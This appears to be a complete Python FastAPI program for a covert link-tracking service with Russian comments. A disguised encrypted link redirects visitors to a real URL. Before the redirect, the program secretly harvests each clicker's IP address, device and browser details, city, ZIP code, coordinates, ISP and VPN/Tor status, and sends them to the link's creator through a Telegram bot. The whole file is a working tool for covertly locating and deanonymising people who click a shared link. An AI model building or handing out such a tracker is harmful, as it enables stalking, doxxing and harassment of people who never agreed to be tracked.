from fastapi import FastAPI, Request
from fastapi.responses import RedirectResponse
from cryptography.fernet import Fernet
import httpx
import json
from datetime import datetime
from config import SECRET_KEY, BOT_TOKEN
import user_agents

app = FastAPI()
cipher = Fernet(SECRET_KEY)

VPNAPI_TOKEN = ""  # оставь пустым, бесплатный план позволяет без токена

@app.get("/link/{encrypted_url}")
async def redirect_encrypted(request: Request, encrypted_url: str):
    try:
        data_json = cipher.decrypt(encrypted_url.encode()).decode()
        data = json.loads(data_json)
        original_url = data["url"]
        user_id = data["user_id"]
    except:
        return {"error": "Invalid link"}

    ip = request.client.host
    headers = request.headers
    user_agent_str = headers.get("user-agent", "Unknown")
    ua = user_agents.parse(user_agent_str)
    accept_lang = headers.get("accept-language", "N/A")

    # Гео-информация
    geo_info = {}
    try:
        response = httpx.get(f"http://ip-api.com/json/{ip}")
        geo_info = response.json()
    except:
        pass

    # VPN/Proxy/Tor через vpnapi.io
    vpn_info = {}
    try:
        url = f"https://vpnapi.io/api/{ip}?strictness=1&key={VPNAPI_TOKEN}"
        response = httpx.get(url)
        if response.status_code == 200:
            data_vpn = response.json()
            vpn_info = {
                "vpn": data_vpn.get("security", {}).get("vpn", False),
                "proxy": data_vpn.get("security", {}).get("proxy", False),
                "tor": data_vpn.get("security", {}).get("tor", False),
                "asn": data_vpn.get("asn", "N/A"),
                "org": data_vpn.get("organization", "N/A"),
                "connection_type": data_vpn.get("connection_type", "N/A"),
                "timezone": data_vpn.get("time_zone", "N/A")
            }
    except:
        vpn_info = {
            "vpn": "N/A", "proxy": "N/A", "tor": "N/A",
            "asn": "N/A", "org": "N/A", "connection_type": "N/A", "timezone": "N/A"
        }

    # Формируем сообщение
    msg_text = f"""
🔗 *Кто-то кликнул по твоей ссылке!*

🕒 Время: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
🌐 IP: {ip}
🖥 User-Agent: {user_agent_str}
🌏 Язык системы: {accept_lang}

💻 Платформа: {ua.os.family} {ua.os.version_string}
🌍 Браузер: {ua.browser.family} {ua.browser.version_string}
📱 Тип устройства: {ua.device.family}

🏙 Гео:
- Страна: {geo_info.get('country', 'N/A')}
- Регион: {geo_info.get('regionName', 'N/A')}
- Город: {geo_info.get('city', 'N/A')}
- ZIP: {geo_info.get('zip', 'N/A')}
- ISP: {geo_info.get('isp', 'N/A')}
- Координаты (Ширина/Долгота)я: {geo_info.get('lat', 'N/A')}, {geo_info.get('lon', 'N/A')}

🌐 Сетевая информация:
- ASN: {vpn_info.get('asn')}
- Организация: {vpn_info.get('org')}
- Тип подключения: {vpn_info.get('connection_type')}
- Часовой пояс: {vpn_info.get('timezone')}

🔒 VPN/Proxy/Tor:
- VPN: {vpn_info.get('vpn')}
- Proxy: {vpn_info.get('proxy')}
- Tor: {vpn_info.get('tor')}
"""

    # Отправка в Telegram
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": user_id, "text": msg_text, "parse_mode": "Markdown"}
            )
    except Exception as e:
        print("Ошибка отправки в Telegram:", e)

    return RedirectResponse(original_url)


if __name__ == "__main__":
    import uvicorn
    print("Сервер запущен на порту 8000")
    uvicorn.run(app, host="0.0.0.0", port=8000)